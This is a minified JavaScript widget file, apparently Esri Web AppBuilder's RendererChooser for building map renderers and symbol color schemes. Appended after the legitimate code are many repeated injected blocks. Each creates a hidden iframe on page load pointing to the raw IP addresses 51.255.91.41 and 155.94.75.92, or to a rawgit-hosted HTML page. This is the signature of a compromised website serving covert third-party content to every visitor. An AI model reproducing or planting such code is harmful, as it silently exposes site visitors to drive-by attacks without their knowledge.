define("dojo/_base/declare dijit/_WidgetBase dijit/_TemplatedMixin dijit/_WidgetsInTemplateMixin dojo/text!./templates/RendererChooser.html dojo/_base/lang dojo/_base/html dojo/_base/array dojo/on dojo/query dojox/gfx dojo/_base/Color jimu/symbolUtils jimu/rendererUtils esri/renderers/SimpleRenderer esri/renderers/UniqueValueRenderer esri/renderers/ClassBreaksRenderer esri/symbols/jsonUtils esri/symbols/SimpleMarkerSymbol dijit/form/Select dijit/form/ComboBox dijit/form/NumberSpinner dijit/form/NumberTextBox jimu/dijit/SymbolChooser".split(" "),
function(w,x,y,z,A,g,c,p,h,l,u,r,m,t,B,C,D,q,v){return w([x,y,z],{templateString:A,baseClass:"jimu-renderer-chooser",declaredClass:"jimu.dijit.RendererChooser",renderer:null,type:null,nls:null,fields:null,_uniqueColors:{color1:"#fce138 #fff799 #fcd27e #f1983c #a553b7 #b1a9d0 #6ecffc #4c81cd #fc6f84 #fc3e5a #69f488 #48885c".split(" "),color2:"#102432 #144d59 #ffc754 #ea9010 #a54e1d #661510 #d8341a #b31515 #4a0932 #8c213f #18382e #2c6954".split(" "),color3:"#be9626 #607100 #00734c #704489 #01acca #024e76 #f09100 #ea311f #c6004b #7570b3 #666666 #333333".split(" "),
color4:"#fffa00 #f5cb11 #9fd40c #46e29c #32b8a6 #7ff2fa #ad00f2 #c461ea #eb7200 #e8a784 #bf2e2e #6c7000".split(" "),color5:"#191921 #11495c #78b1c2 #454f4b #8f8f82 #99dbbc #87b051 #f7ec88 #ebdcc1 #dbb658 #c43541 #75351e".split(" "),color6:"#332424 #751555 #d47013 #d68989 #211173 #82aad6 #7bfaeb #6ec9a8 #6b6408 #e9da40 #ccc54a #1fc235".split(" ")},_classBreaksColors:{color1:["#eaf0fd","#03519e"],color2:["#ebf9e7","#046e2e"],color3:["#f5f5f5","#2a2a2a"],color4:["#ffeddd","#a83a00"],color5:["#f2eef6",
"#582890"],color6:["#ffe3d7","#a71713"],color7:["#ecf7fb","#006d2a"],color8:["#edf8fa","#83067e"],color9:["#eef9e8","#0167af"],color10:["#fff1d7","#b80201"],color11:["#f0eef6","#015b90"],color12:["#f5eff7","#006dfa"],color13:["#f1eef7","#9c0042"],color14:["#ffebe2","#7d0078"],color15:["#ffffc9","#016a35"],color16:["#ffffcb","#253197"],color17:["#fffed1","#9e3601"],color18:["#ffffad","#c20120"],color19:["#a9620d","#038772"],color20:["#d3168c","#46ae1b"],color21:["#7c2d96","#048936"],color22:["#eb6300",
"#603b9b"],color23:["#cc0117","#0471b2"],color24:["#ce0118","#424242"],color25:["#db1a10","#287cba"],color26:["#da1baf","#03983e"],color27:["#db1a10","#2483bb"]},_selectedUniqueValueTr:null,_selectedClassBreakTr:null,_isDrawing:!1,_jimuUrl:window.location.protocol+"//"+window.location.host+require.toUrl("jimu"),postMixInProperties:function(){this.fields||(this.fields=[]);this.nls=window.jimuNls.rendererChooser;this.inherited(arguments)},postCreate:function(){this.inherited(arguments);this._initFields();
this.own(h(this.rendererSelect,"change",g.hitch(this,this._onRendererSelectChange)));this.own(h(this.btnDefaultSym,"click",g.hitch(this,this._showDefaultSymbol)));this.own(h(this.defaultSymbolChooser,"change",g.hitch(this,this._onDefaultSymbolChange)));this.own(h(this.selectedSymbolChooser,"change",g.hitch(this,this._onSelectedSymbolChange)));this._bindUniqueSettingEvents();this._bindClassBreaksEvents();this.renderer?this.showByRenderer(this.renderer):this.type&&this.showByType(this.type);this._onRendererSelectChange()},
getRenderer:function(){var a=null,b=this.rendererSelect.get("value");if("simple"===b)a=this._getSimpleRenderer();else if("unique"===b)a=this._getUniqueValueRenderer();else if("color"===b||"size"===b)a=this._getClassBreaksRenderer();return a},reset:function(){this.type=this.renderer=null;c.setStyle(this.domNode,"display","none")},showByRenderer:function(a){this.reset();c.setStyle(this.domNode,"display","block");this.renderer=a;this.type=null;this._setDefaultSymbol(this.renderer&&(this.renderer.defaultSymbol||
this.renderer.symbol));this._updateRendererSelect();t.isSimpleRenderer(this.renderer)?this.rendererSelect.set("value","simple"):t.isUniqueValueRenderer(this.renderer)?this._showUniqueValueRenderer(this.renderer):t.isClassBreaksRenderer(this.renderer)?this._showClassBreaksRenderer(this.renderer):this.showByType(this.type);(a=this.defaultSymbolChooser.getSymbol())&&this._onDefaultSymbolChange(a)},showByType:function(a){this.reset();this.type=this.renderer=null;if("marker"===a||"line"===a||"fill"===
a)c.setStyle(this.domNode,"display","block"),this.type=a,this.defaultSymbolChooser.showByType(a),this._updateRendererSelect(),(a=this.defaultSymbolChooser.getSymbol())&&this._onDefaultSymbolChange(a)},_setDefaultSymbol:function(a){this.type=null;a&&(m.isSimpleMarkerSymbol(a)||m.isPictureMarkerSymbol(a)?this.type="marker":m.isSimpleLineSymbol(a)?this.type="line":m.isSimpleFillSymbol(a)&&(this.type="fill"),this.type&&this.defaultSymbolChooser.showBySymbol(a))},_onDefaultSymbolChange:function(a){c.empty(this.defaultSymPreviewDiv);
if(a){var b=null;(b=m.isSimpleLineSymbol(a)||m.isCartographicLineSymbol(a)?m.createSymbolNode(a,{width:80,height:30}):m.createSymbolNode(a))&&c.place(b,this.defaultSymPreviewDiv)}},_updateRendererSelect:function(){var a=this.rendererSelect.getOptions("size");"marker"===this.type?a||this.rendererSelect.addOption({value:"size",label:"Size"}):("line"===this.type||"fill"===this.type)&&a&&this.rendererSelect.removeOption(a)},_initFields:function(){if(this.fields&&0<this.fields.length){var a="";p.forEach(this.fields,
g.hitch(this,function(b){b&&"string"===typeof b&&(a||(a=b),this._addField(b))}));a&&!this.fieldComboBox.get("displayedValue")&&this.fieldComboBox.set("displayedValue",a)}},_addField:function(a){this.fieldComboBox.get("store").add({name:a})},_onRendererSelectChange:function(){var a=this.rendererSelect.get("value");"simple"===a?(c.setStyle(this.fieldSelectTr,"display","none"),c.setStyle(this.colorBlockTr,"display","none"),c.setStyle(this.colorBarTr,"display","none"),c.setStyle(this.domainTr,"display",
"none"),c.setStyle(this.classCountTr,"display","none"),c.setStyle(this.uniqueSetting,"display","none"),c.setStyle(this.classBreaksSetting,"display","none"),c.setStyle(this.defaultSymPreview,"display","none"),c.setStyle(this.symbolSizeDomainTr,"display","none")):"unique"===a?(c.setStyle(this.fieldSelectTr,"display","table-row"),c.setStyle(this.colorBlockTr,"display","table-row"),c.setStyle(this.colorBarTr,"display","none"),c.setStyle(this.domainTr,"display","none"),c.setStyle(this.classCountTr,"display",
"none"),c.setStyle(this.uniqueSetting,"display","block"),c.setStyle(this.classBreaksSetting,"display","none"),c.setStyle(this.defaultSymPreview,"display","block"),c.setStyle(this.symbolSizeDomainTr,"display","none"),this._updateUniqueValueDivVisibility()):"color"===a?(c.setStyle(this.fieldSelectTr,"display","table-row"),c.setStyle(this.colorBlockTr,"display","none"),c.setStyle(this.classCountTr,"display","table-row"),c.setStyle(this.domainTr,"display","table-row"),c.setStyle(this.colorBarTr,"display",
"table-row"),c.setStyle(this.uniqueSetting,"display","none"),c.setStyle(this.defaultSymPreview,"display","block"),c.setStyle(this.symbolSizeDomainTr,"display","none"),this._updateClassBreaksSettingVisibility()):"size"===a&&(c.setStyle(this.fieldSelectTr,"display","table-row"),c.setStyle(this.colorBlockTr,"display","none"),c.setStyle(this.colorBarTr,"display","none"),c.setStyle(this.domainTr,"display","table-row"),c.setStyle(this.classCountTr,"display","table-row"),c.setStyle(this.uniqueSetting,"display",
"none"),c.setStyle(this.defaultSymPreview,"display","block"),c.setStyle(this.symbolSizeDomainTr,"display","table-row"),this._updateClassBreaksSettingVisibility())},_showDefaultSymbol:function(){c.setStyle(this.defaultSymSection,"display","block");c.setStyle(this.selectedSymSection,"display","none")},_showSelectedSymbol:function(a){c.setStyle(this.defaultSymSection,"display","none");c.setStyle(this.selectedSymSection,"display","block");var b=this.rendererSelect.get("value");if("simple"===b)c.setStyle(this.uniqueSelectedSymInfoSet,
"display","none"),c.setStyle(this.classBreaksSelectedInfoSet,"display","none");else if("unique"===b)c.setStyle(this.uniqueSelectedSymInfoSet,"display","block"),c.setStyle(this.classBreaksSelectedInfoSet,"display","none");else if("color"===b||"size"===b)c.setStyle(this.uniqueSelectedSymInfoSet,"display","none"),c.setStyle(this.classBreaksSelectedInfoSet,"display","block");this.selectedSymbolChooser.showBySymbol(a)},_onSelectedSymbolChange:function(a){var b=this.rendererSelect.get("value");"unique"===
b?this._onUniqueSelectedSymbolChange(a):"color"===b?this._onClassBreakSelectedSymbolChange(a):"size"===b&&this._onClassBreakSelectedSymbolChange(a)},_cloneSymbol:function(a){if(!a)return null;a=a.toJson();return q.fromJson(a)},_drawSymbolPreview:function(a,b){var e=this._cloneSymbol(b);c.empty(a);b=80;var d=30;if("simplemarkersymbol"===e.type)d=b=Math.min(e.size+12,125);else if("picturemarkersymbol"===e.type){if(!e.url||"http://"===e.url||-1===e.url.indexOf("http://")&&-1===e.url.indexOf("https://")&&
-1===e.url.indexOf("data:"))return;d=b=Math.min(Math.max(e.width,e.height),125)}else if("simplelinesymbol"===e.type||"cartographiclinesymbol"===e.type)b=190,d=20;60<b&&(b=60);a=u.createSurface(a,b,d);if("vml"===u.renderer){var f=a.getEventSource();c.setStyle(f,"position","relative");c.setStyle(f.parentNode,"position","relative")}var f=null,f=q.getShapeDescriptors(e),n;try{n=a.createShape(f.defaultShape).setFill(f.fill).setStroke(f.stroke)}catch(E){a.clear();a.destroy();return}var e=a.getDimensions(),
e={dx:e.width/2,dy:e.height/2},k=n.getBoundingBox(),f=k.width,k=k.height;if(f>b||k>d)b=((b<d?b:d)-5)/(f>k?f:k),g.mixin(e,{xx:b,yy:b});n.applyTransform(e);return a},_getSimpleRenderer:function(){var a=this.defaultSymbolChooser.getSymbol();return new B(a)},_bindUniqueSettingEvents:function(){this.own(h(this.btnAddUniqueValue,"click",g.hitch(this,this._onAddUniqueValue)));this.own(h(this.uniqueSelectedValue,"change",g.hitch(this,this._onUniqueSelectedValueChange)));this.own(h(this.uniqueSelectedLabel,
"change",g.hitch(this,this._onUniqueSelectedLabelChange)));this.own(h(this.uniqueColorSelect,"change",g.hitch(this,this._onUniqueColorSelectChange)))},_showUniqueValueRenderer:function(a){this.rendererSelect.set("value","unique");this.fieldComboBox.set("displayedValue",a.attributeField);c.empty(this.uniqueSysTbody);p.forEach(a.infos,g.hitch(this,function(a){this._addUniqueValueTr(a.symbol,a.value,a.label||a.value)}))},_getUniqueValueRenderer:function(){var a=this.defaultSymbolChooser.getSymbol(),
b=this.fieldComboBox.get("value"),e=new C(a,b),a=l(".unique-symbol-tr",this.uniqueSysTbody);p.forEach(a,g.hitch(this,function(a){e.addValue({value:a.value,symbol:a.symbol,label:a.label,description:a.label})}));return e},_onUniqueColorSelectChange:function(){var a=this._getSelectedUniqueColors(),b=l(".unique-symbol-tr",this.uniqueSysTbody);p.forEach(b,g.hitch(this,function(b,c){b.symbol&&!m.isPictureMarkerSymbol(b.symbol)&&(b.symbol.setColor(a[c%a.length]),c=l(".symbol-div",b)[0],this._drawSymbolPreview(c,
b.symbol),this._selectedUniqueValueTr===b&&this._showSelectedSymbol(b.symbol))}))},_onUniqueSelectedValueChange:function(){var a=this._selectedUniqueValueTr;a&&(a.value=this.uniqueSelectedValue.value,a.label=this.uniqueSelectedLabel.value,l(".label-div",a)[0].innerHTML=a.label)},_onUniqueSelectedLabelChange:function(){var a=this._selectedUniqueValueTr;a&&(a.label=this.uniqueSelectedLabel.value,l(".label-div",a)[0].innerHTML=a.label)},_onUniqueSelectedSymbolChange:function(a){var b=this._selectedUniqueValueTr;
b&&(b.symbol=a,(b=l(".symbol-div",b)[0])&&this._drawSymbolPreview(b,a))},_onAddUniqueValue:function(){var a=g.trim(this.uniqueEditValue.value);if(a){var b=l(".unique-symbol-tr",this.uniqueSysTbody),e=this._getSelectedUniqueColors(),b=this._getUniqueSymbol(e[b.length%e.length]);this._addUniqueValueTr(b,a,a)}this.uniqueEditValue.value=""},_addUniqueValueTr:function(a,b,e){b=g.trim(b);var d=c.toDom('\x3ctr class\x3d"unique-symbol-tr"\x3e\x3ctd class\x3d"symbol-td"\x3e\x3cdiv class\x3d"symbol-div"\x3e\x3c/div\x3e\x3c/td\x3e\x3ctd class\x3d"edit-td"\x3e\x3cdiv wrap class\x3d"label-div"\x3e\x3c/div\x3e\x3c/td\x3e\x3ctd class\x3d"delete-td"\x3e\x3cdiv class\x3d"delete-div jimu-icon jimu-icon-delete"\x3e\x3c/div\x3e\x3c/td\x3e\x3c/tr\x3e');
c.place(d,this.uniqueSysTbody);this._updateUniqueSymTableStyle();var f=l(".symbol-div",d)[0],n=l(".label-div",d)[0],k=l(".delete-div",d)[0];n.innerHTML=b;this.own(h(d,"click",g.hitch(this,function(){this._selectUniqueValueTr(d)})));this.own(h(k,"click",g.hitch(this,function(a){a.stopPropagation();this._selectedUniqueValueTr===d&&(this._selectedUniqueValueTr=null);c.destroy(d);this._updateUniqueSymTableStyle();this._updateUniqueValueDivVisibility()})));this._drawSymbolPreview(f,a);d.symbol=a;d.value=
b;d.label=e;this._selectUniqueValueTr(d);c.setStyle(this.uniqueValueDiv,"display","block")},_selectUniqueValueTr:function(a){l(".unique-symbol-tr",this.uniqueSysTbody).removeClass("selected");c.addClass(a,"selected");this._selectedUniqueValueTr=a;this.uniqueSelectedValue.value=a.value;this.uniqueSelectedLabel.value=a.label;this._showSelectedSymbol(a.symbol)},_updateUniqueSymTableStyle:function(){},_getSelectedUniqueColors:function(){var a=this.uniqueColorSelect.get("value");return p.map(this._uniqueColors[a],
g.hitch(this,function(a){return new r(a)}))},_getUniqueSymbol:function(a){var b=null;if("marker"===this.type)b=new v({style:"esriSMSCircle",color:[0,0,128,128],name:"Circle",outline:{color:[191,151,39,255],width:1},type:"esriSMS",size:18}),b.setColor(a);else if("line"===this.type||"fill"===this.type)b=this.defaultSymbolChooser.getSymbol(),b=q.fromJson(b.toJson()),b.setColor(a);return b},_updateUniqueValueDivVisibility:function(){var a=0===l(".unique-symbol-tr",this.uniqueSysTbody).length?"none":"block";
c.setStyle(this.uniqueValueDiv,"display",a)},_bindClassBreaksEvents:function(){this.own(h(this.minDomain,"change",g.hitch(this,this._updateClassBreaksTable)));this.own(h(this.maxDomain,"change",g.hitch(this,this._updateClassBreaksTable)));this.own(h(this.classCount,"change",g.hitch(this,this._updateClassBreaksTable)));this.own(h(this.selectedFrom,"change",g.hitch(this,this._onSelectedRangeChange)));this.own(h(this.selectedTo,"change",g.hitch(this,this._onSelectedRangeChange)));this.own(h(this.classBreakSelectedLabel,
"change",g.hitch(this,this._onClassBreakSelectedLabelChange)));this.own(h(this.classBreaksColorSelect,"change",g.hitch(this,this._updateClassBreaksTable)));this.own(h(this.minSymbolSize,"change",g.hitch(this,this._updateClassBreaksTable)));this.own(h(this.maxSymbolSize,"change",g.hitch(this,this._updateClassBreaksTable)))},_showClassBreaksRenderer:function(a){this._isDrawing=!0;this.rendererSelect.set("value","color");var b=Infinity,e=-Infinity;this.fieldComboBox.set("displayedValue",a.attributeField);
this.classCount.set("value",a.infos.length);c.empty(this.classBreaksTbody);p.forEach(a.infos,g.hitch(this,function(a){var c=a.minValue,d=a.maxValue;this._addClassBreaksTr(a.symbol,c,d,a.label?a.label:a.minValue+" \u2014\u2014 "+a.maxValue);b=Math.min(b,c);e=Math.max(e,d)}));this.minDomain.set("value",b);this.maxDomain.set("value",e);if("marker"===this.type){var d=Infinity,f=-Infinity;p.forEach(a.infos,g.hitch(this,function(a){a=a.symbol;a=m.isPictureMarkerSymbol(a)?a.width:a.size;d=Math.min(a,d);
f=Math.max(a,f)}));this.minSymbolSize.set("value",d);this.maxSymbolSize.set("value",f);this.minSymSize!==this.maxSymSize&&this.rendererSelect.set("value","size")}var n=this;setTimeout(function(){n._isDrawing=!1},1E3)},_getClassBreaksRenderer:function(){var a=this.defaultSymbolChooser.getSymbol(),b=this.fieldComboBox.get("value"),c=new D(a,b),a=l(".class-breaks-tr",this.classBreaksTbody);p.forEach(a,g.hitch(this,function(a){c.addBreak({minValue:a.from,maxValue:a.to,symbol:a.symbol,label:a.label})}));
return c},_onClassBreakSelectedSymbolChange:function(a){var b=this._selectedClassBreakTr;b&&(b.symbol=a,b=l(".symbol-div",b)[0],this._drawSymbolPreview(b,a))},_onSelectedRangeChange:function(){var a=parseFloat(this.selectedFrom.get("value")),b=parseFloat(this.selectedTo.get("value"));if(a>b){var c=a,a=b,b=c;this.selectedFrom.set("value",a);this.selectedTo.set("value",b)}!(c=this._selectedClassBreakTr)||c.from===a&&c.to===b||(c.from=a,c.to=b,a=a+" \u2014 "+b,c.label=a,this.classBreakSelectedLabel.value=
a,l(".label-div",c)[0].innerHTML=a)},_onClassBreakSelectedLabelChange:function(){var a=this._selectedClassBreakTr;if(a){var b=this.classBreakSelectedLabel.value;a.label=b;l(".label-div",a)[0].innerHTML=b}},_updateClassBreaksTable:function(){if(!this._isDrawing){c.setStyle(this.classBreaksSetting,"display","none");c.empty(this.classBreaksTbody);var a=parseFloat(this.minDomain.get("value")),b=parseFloat(this.maxDomain.get("value"));if(a>b){var e=a,a=b,b=e;this.minDomain.set("value",a);this.maxDomain.set("value",
b)}else if(a===b)return;var d=parseFloat(this.minSymbolSize.get("value")),f=parseFloat(this.maxSymbolSize.get("value"));d>f&&(e=d,d=f,f=e,this.minSymbolSize.set("value",d),this.maxSymbolSize.set("value",f));var e=parseInt(this.classCount.get("value"),10),g=(b-a)/e,b=[],k;for(k=0;k<=e;k++){var h=a+g*k,h=parseFloat(h.toFixed(4));b.push(h)}k=this.rendererSelect.get("value");a=[];"color"===k?a=this._createColorClassBreaksSymbols(e):"size"===k&&(a=this._createSizeClassBreaksSymbols(e,d,f));for(k=0;k<e;k++)d=
b[k],f=b[k+1],this._addClassBreaksTr(a[k],d,f,d+" \u2014 "+f);this._updateClassBreaksSettingVisibility()}},_selectClassBreaksTr:function(a){l(".class-breaks-tr",this.classBreaksTbody).removeClass("selected");c.addClass(a,"selected");this._selectedClassBreakTr=a;var b=a.symbol,e=parseFloat(a.from),d=parseFloat(a.to);a=a.label;this.selectedFrom.set("value",e);this.selectedTo.set("value",d);this.classBreakSelectedLabel.value=a;this._showSelectedSymbol(b)},_addClassBreaksTr:function(a,b,e,d){var f=c.toDom('\x3ctr class\x3d"class-breaks-tr"\x3e\x3ctd class\x3d"symbol-td"\x3e\x3cdiv class\x3d"symbol-div"\x3e\x3c/div\x3e\x3c/td\x3e\x3ctd class\x3d"label-td"\x3e\x3cdiv wrap class\x3d"label-div"\x3e\x3c/div\x3e\x3c/td\x3e\x3ctd class\x3d"delete-td"\x3e\x3cdiv class\x3d"delete-div jimu-icon jimu-icon-delete"\x3e\x3c/div\x3e\x3c/td\x3e\x3c/tr\x3e');
c.place(f,this.classBreaksTbody);f.symbol=a;f.from=b;f.to=e;f.label=d;b=l(".symbol-div",f)[0];e=l(".label-div",f)[0];var n=l(".delete-div",f)[0];this._drawSymbolPreview(b,a);e.innerHTML=d;this.own(h(f,"click",g.hitch(this,function(){this._selectClassBreaksTr(f)})));this.own(h(n,"click",g.hitch(this,function(a){a.stopPropagation();this._selectClassBreaksTr===f&&(this._selectClassBreaksTr=null);c.destroy(f);this._updateClassBreaksSettingVisibility()})));this._updateClassBreaksTableStyle();this._showDefaultSymbol();
c.setStyle(this.classBreaksSetting,"display","block")},_updateClassBreaksTableStyle:function(){},_updateClassBreaksSettingVisibility:function(){var a=0===l(".class-breaks-tr",this.classBreaksTbody).length?"none":"block";c.setStyle(this.classBreaksSetting,"display",a)},_createColorClassBreaksSymbols:function(a){for(var b=[],c=this._createClassBreaksColors(a),d=0;d<a;d++){var f=c[d],g=null;if("marker"===this.type)g=new v({style:"esriSMSCircle",color:[0,0,128,128],name:"Circle",outline:{color:[191,151,
39,255],width:1},type:"esriSMS",size:18}),g.setColor(f);else if("line"===this.type||"fill"===this.type)g=this.defaultSymbolChooser.getSymbol(),g=q.fromJson(g.toJson()),g.setColor(f);b.push(g)}return b},_createClassBreaksColors:function(a){for(var b=[],c=this.classBreaksColorSelect.get("value"),d=this._classBreaksColors[c],c=new r(d[0]),f=new r(d[1]),d=Math.floor((f.r-c.r)/a),g=Math.floor((f.g-c.g)/a),f=Math.floor((f.b-c.b)/a),k=0;k<a;k++){var h=new r([c.r+d*k,c.g+g*k,c.b+f*k,255]);b.push(h)}return b},
_createSizeClassBreaksSymbols:function(a,b,c){var d=this.defaultSymbolChooser.getSymbol(),f=[];c=(c-b)/(a-1);for(var e=0;e<a;e++){var g=Math.round(b+c*e),h=d.toJson(),h=q.fromJson(h);m.isPictureMarkerSymbol(h)?(h.setWidth(g),h.setHeight(g)):h.setSize(g);f.push(h)}return f}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});